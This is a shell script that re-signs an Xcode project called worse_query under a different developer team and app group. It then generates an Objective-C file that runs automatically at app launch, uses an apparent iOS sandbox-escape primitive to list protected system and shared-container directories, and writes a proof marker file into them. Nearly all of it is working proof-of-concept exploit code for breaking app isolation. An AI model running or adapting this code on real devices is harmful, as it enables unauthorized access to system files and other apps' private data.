#!/bin/zsh
PBX=/tmp/worse_query/worse_query.xcodeproj/project.pbxproj
ENT=/tmp/worse_query/worse_query/worse_query.entitlements
CV=/tmp/worse_query/worse_query/ContentView.swift

perl -pi -e 's/K976G5HK7K/4L9HF29JJU/g' "$PBX"
perl -pi -e 's/cc\.forcequit\.worse-query/com.USER_.worsequery/g' "$PBX"
perl -pi -e 's/group\.cc\.forcequit\.worse-query/group.USER_.worsequery/g' "$ENT"
perl -pi -e 's/group\.cc\.forcequit\.worse-query/group.USER_.worsequery/g' "$CV"

cat > /tmp/worse_query/worse_query/AutoProof.m <<'WQEOF'
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <stdio.h>
#include "worse_query.h"

static NSString *WQLogPath(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    if (!docs) return @"/tmp/wq_proof.log";
    return [docs stringByAppendingPathComponent:@"wq_proof.log"];
}

static void WQLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[WQPROOF] %@", msg);
    FILE *f = fopen(WQLogPath().fileSystemRepresentation, "a");
    if (f) {
        fprintf(f, "%s\n", msg.UTF8String);
        fflush(f);
        fclose(f);
    }
}

static void WQProof(void) {
    @autoreleasepool {
        NSString *logPath = WQLogPath();
        [[NSFileManager defaultManager] removeItemAtPath:logPath error:nil];
        WQLog(@"=== worse_query proof start ===");

        NSString *group = @"group.USER_.worsequery";
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        WQLog(@"group=%@ container=%@", group, groupURL.path ? groupURL.path : @"(nil)");

        NSArray<NSString *> *targets = @[
            @"/private/var/containers/Data/System",
            @"/private/var/mobile/Containers/Shared/AppGroup",
            @"/private/var/containers/Shared/SystemGroup",
        ];

        for (NSString *target in targets) {
            NSError *preErr = nil;
            NSArray *pre = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:target error:&preErr];
            WQLog(@"TARGET %@", target);
            WQLog(@"  pre-list count=%ld err=%@", (long)pre.count, preErr.localizedDescription ? preErr.localizedDescription : @"(none)");

            int64_t handle = worse_query(target, group, false, false);
            WQLog(@"  worse_query handle=%lld", (long long)handle);

            if (handle > 0) {
                NSError *err = nil;
                NSArray *items = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:target error:&err];
                WQLog(@"  POST-LIST count=%ld err=%@", (long)items.count, err.localizedDescription ? err.localizedDescription : @"(none)");
                NSInteger shown = 0;
                for (NSString *it in items) {
                    if (shown++ >= 12) { WQLog(@"  ..."); break; }
                    WQLog(@"    %@", it);
                }
                NSString *marker = [target stringByAppendingPathComponent:@"wq_escape_proof.txt"];
                NSError *werr = nil;
                BOOL wrote = [@"WQ_ESCAPE_OK\n" writeToFile:marker atomically:YES encoding:NSUTF8StringEncoding error:&werr];
                WQLog(@"  marker-write ok=%d err=%@", wrote, werr.localizedDescription ? werr.localizedDescription : @"(none)");
                worse_query_release(handle);
            }
        }
        WQLog(@"=== worse_query proof done ===");
    }
}

__attribute__((constructor))
static void WQProofCtor(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        WQProof();
    });
}
WQEOF

grep -n 'DEVELOPMENT_TEAM\|PRODUCT_BUNDLE_IDENTIFIER' "$PBX"
grep -n 'group.USER_.worsequery' "$ENT"
grep -n 'group.USER_.worsequery' "$CV"
wc -l /tmp/worse_query/worse_query/AutoProof.m
echo PATCH_DONE
